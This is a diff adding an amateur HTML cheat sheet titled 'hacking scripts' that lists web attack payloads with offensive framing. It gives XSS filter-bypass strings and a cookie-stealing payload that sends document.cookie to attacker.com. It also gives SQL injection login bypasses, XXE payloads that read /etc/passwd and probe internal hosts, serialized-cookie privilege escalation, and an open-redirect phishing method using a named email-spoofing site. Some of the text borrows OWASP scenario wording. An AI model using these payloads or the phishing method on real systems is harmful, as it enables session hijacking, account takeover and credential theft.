@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+
+<h1> hacking scripts</h1>
+
+</head>
+
+
+<body style="background-color:black;color:green;">
+
+                         <center><h2>XSS scripts</h2></center>
+
+<p>XSS flaws occur whenever an application includes untrusted data in a new web page without 
+proper validation or escaping, or updates an existing web page with user-supplied data using a browser
+ API that can create HTML or JavaScript. XSS allows attackers to execute scripts in the victim’s browser 
+which can hijack user sessions, deface web sites, or redirect the user to malicious sites.</p>
+
+          <u> <h4>XSS to steal cookie</h4></u>
+
+<p> 
+<b style="color:red;">
+<b><</b>script>alert(document.cookie);<b><</b>/script>
+</b> 
+</p>
+
+<p>this will alert victim's cookie to victim (u can modify it and make cookie store in ur server)</p>
+
+           <u> <h4>XSS reflected </h4></u>
+
+<p>this scripts can be entered anywere ex:username,password,links etc...</p>
+<p>this works only when user clicks on links</p>
+<p>
+<b style="color:red;">
+<b><</b>script>prompt(document.cookie);<b><</b>/script>
+</b>
+</p>
+<p>
+<b style="color:red;">
+<b><</b>script>confirm("this will notify victim");<b><</b>/script>
+</b>
+</p>
+<p>this both will notify victim and similar to the above one(xss to steal cookie)</p>
+
+    <u>  <h5>IF XSS IS IN MEDIUM AND HIGH LEVEL</h5></u>
+
+<p>then use </p>
+<p>
+<b style="color:red;">
+<b><</b>ScRiPt>any scripts<b><</b>/ScRiPt>
+</b>
+</p>
+<p>just use cap letter and small letter and u can also try</p>
+<p>
+<b style="color:red;">
+<b><</b>svg onload=alert("this will just alert u wat u written in bracket")<b>></b>
+</b>
+</p>
+
+             <u> <h4>XSS stored</h4></u>
+
+<p>this type of xss is more dangerous because it is stored in the server.these scripts 
+are entered in comments and etc where the server can store it.</p>
+<p>this is dangerous for them who visit the page</p>
+<p>
+<b style="color:red;">
+<b><</b>script>alert(document.domain);<b><</b>/script>
+</b>
+</p>
+<p>this will alert ur domain name</p>
+<p>if many script did not run then try this</p>
+<p>
+<b style="color:red;">
+<b><</b>svg onload=alert(document.location);>
+</b>
+</p>
+<p>
+Example Attack Scenarios<br>
+Scenario #1: The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:<br>
+<b style="color:red;">(String) page += "<b><</b>input name='creditcard' type='TEXT'<br>
+value='" + request.getParameter("CC") + "'>";</b><br>
+The attacker modifies the ‘CC’ parameter in the browser to:<br>
+<b style="color:red;">'><b><</b>script>document.location=<br>
+'http://www.attacker.com/cgi-bin/cookie.cgi?<br>
+foo='+document.cookie<b><</b>/script>'.</b><br>
+This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.<br>
+Note: Attackers can use XSS to defeat any automated Cross-Site Request Forgery (CSRF) defense the application might employ.
+</p>
+
+                           <center><h2>Injection</h2></center>
+
+<u><h4>SQL injuction script</h4></u>
+<b style="color:red;"><p>anything' or '1'='1</p></b>
+<u><b><h4>injuction</h4></b></u>
+<p>Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a 
+command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data 
+without proper authorization.</p>
+<p>Injection flaws are very prevalent, particularly in legacy code. Injection vulnerabilities are often found in SQL, LDAP,
+ XPath, or NoSQL queries, OS commands, XML parsers, SMTP headers, expression languages, and ORM queries.
+Injection flaws are easy to discover when examining code. Scanners and fuzzers can help attackers find injection flaws.</p>
+<p>ome of the more common injections are SQL, NoSQL, OS command, Object Relational Mapping (ORM), LDAP, and Expression Language (EL)
+ or Object Graph Navigation Library (OGNL) injection. The concept is identical among all interpreters. Source code review is the
+ best method of detecting if applications are vulnerable to injections, closely followed by thorough automated testing of all parameters,
+ headers, URL, cookies, JSON, SOAP, and XML data inputs. Organizations can include static source (SAST) and dynamic application
+ test (DAST) tools into the CI/CD pipeline to identify newly introduced injection flaws prior to production deployment</p>
+<p>Example Attack Scenarios<br>
+Scenario #1: An application uses untrusted data in the construction of the following vulnerable SQL call:<br>
+<b style="color:red;">String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";</b><br>
+Scenario #2: Similarly, an application’s blind trust in frameworks may result in queries that are still vulnerable, (e.g. Hibernate Query Language (HQL)):<br>
+<b style="color:red;">Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");</b><br>
+In both cases, the attacker modifies the ‘id’ parameter value in their browser to send: ‘ or ‘1’=’1. For example:
+<b>http://example.com/app/accountView?id=' or '1'='1</b><br><br>
+
+This changes the meaning of both queries to return all the records from the accounts table. More dangerous attacks could modify or delete data, or even invoke
+ stored procedures.</p>
+<p>u can also use commands in user name and passwors <br>
+ex:<b style="color:red;"> 12' or '1'='1 </b><br>(or use <b style="color:red;">id' or '1'='1</b> in user name or password and then login)</p>
+<p>u can acess other users account from this attack</p>
+
+                          <center><h2>XML External Entities (XXE)</h2></center>
+
+<p>Many older or poorly configured XML processors evaluate external entity references within XML documents. External entities can be used to
+ disclose internal files using the file URI handler, internal file shares, internal port scanning, remote code execution, and denial of service attacks.</p>
+<p>
+Example Attack Scenarios<br>
+Numerous public XXE issues have been discovered, including attacking embedded devices. XXE occurs in a lot of unexpected places, including deeply
+ nested dependencies. The easiest way is to upload a malicious XML file, if accepted:<br>
+Scenario #1: The attacker attempts to extract data from the server:
+<br>
+<u><b>
+<b><</b>?xml version="1.0" encoding="ISO-8859-1"?><br>
+<b><</b>!DOCTYPE foo [<br>
+<b><</b>!ELEMENT foo ANY >
+</b></u>
+<br><br>
+<b style="color:red;">
+<b><</b>!ENTITY xxe SYSTEM "file:///etc/passwd" >]><br>
+<b><</b>foo>&xxe;<b><</b>/foo>
+<br></b>
+Scenario #2: An attacker probes the server’s private network by changing the above ENTITY line to:<br>
+<b style="color:red;"><b><</b>!ENTITY xxe SYSTEM "https://192.168.1.1/private" <b>></b>]></b><br>
+Scenario #3: An attacker attempts a denial-of-service attack by including a potentially endless file:<br>
+<b style="color:red;"><b><</b>!ENTITY xxe SYSTEM "file:///dev/random"<b>></b>]></b>
+</p>
+
+                                      <center><h2>Broken Access Control</h2></center>
+<p>Restrictions on what authenticated users are allowed to do are often not properly enforced. Attackers can exploit these 
+flaws to access unauthorized functionality and/or data, such as access other users’ accounts, view sensitive files, modify 
+other users’ data, change access rights, etc.</p>
+<p>
+Example Attack Scenarios<br>
+Scenario #1: The application uses unverified data in a SQL call that is accessing account information:
+<br>
+<b style="color:red;">pstmt.setString(1, request.getParameter("acct"));<br>
+ResultSet results = pstmt.executeQuery( );</b><br>
+An attacker simply modifies the ‘acct’ parameter in the browser to send whatever account number they want. If not properly verified,
+ the attacker can access any user’s account.<br>
+<b style="color:red;">http://example.com/app/accountInfo?acct=notmyacct</b><br>
+Scenario #2: An attacker simply force browses to target URLs. Admin rights are required for access to the admin page.<br>
+<b style="color:red;">http://example.com/app/getappInfo<br>
+http://example.com/app/admin_getappInfo</b><br>
+If an unauthenticated user can access either page, it’s a flaw. If a non-admin can access the admin page, this is a flaw.
+</p>
+
+                                         <center><h2>Insecure Deserialization</h2></center>
+
+<p>Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code
+ execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks.</p>
+<p>
+Example Attack Scenarios<br>
+Scenario #1: A React application calls a set of Spring Boot microservices. Being functional programmers, they tried to ensure that their code is
+ immutable. The solution they came up with is serializing user state and passing it back and forth with each request. An attacker notices the “R00” 
+Java object signature, and uses the Java Serial Killer tool to gain remote code execution on the application server.<br>
+Scenario #2: A PHP forum uses PHP object serialization to save a “super” cookie, containing the user’s user ID, role, password hash, and other state:<br>
+<b style="color:red;">a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";<br>
+i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}</b><br>
+An attacker changes the serialized object to give themselves admin privileges:<br>
+<b style="color:red;">a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";<br>
+i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}</b><br>
+</p>
+
+                                           <center><h2>Unvalidated Redirects & Forwards</h2></center>
+
+<p>this is a type of attack where user is forwaeded or redirected to other pages or fake sites to get users details.</p>
+<p>
+Example Attack scenarios<br>
+Scenario #1:for example lets take a site as facebook.com,the attacker take a link of facebook login page and modify it at the end.<br>
+if the link is<br>
+<b>htt<b>ps://facebook.</b>com</b><br>
+the attacker modify it to<br>
+<b>htt<b>ps://facebook.</b>com</b><b style="color:red;">?ReturnUrl=attackers pishing page</b><br>
+if attackers pishing page is https://google.com then he may use<br>
+<b style="color:red;"><b>htt<b>ps://facebook.</b>com</b><b>?ReturnUrl=https://google.com</b></b>
+</p>
+<p>Scenario #2:So here if an attacker sends a email using email snoofing site such as <b>http://emkei.cz</b> using social engenering like "u had not loged
+ in to site for a long time,please login or eles ur account will be deleated" 
+ so that user clicks the link and he will be taken to a original page. and he thinks this site is secure and he logines.but when he clicks on submit
+ button he will be Redirected to attackers pishing page.here user will not notice 
+the site and logines.and his loogin detailes are stolen. </p>
+
+                                                    <center><h2>CSRF Attack</h2></center>
+<p>Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated.
+ With a little help of social engineering (such as sending a link via
+ email or chat), an attacker may trick the users of a web application into executing actions of the attacker’s choosing. If the victim is a normal user, a successful
+ CSRF attack can force the user to perform state changing requests
+ like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application.</p><br>
+<p>u  need to write an script and social enginering technique</p>
+
+
+
+
+
+
+
+
+</body>
+
+
+
+</html>
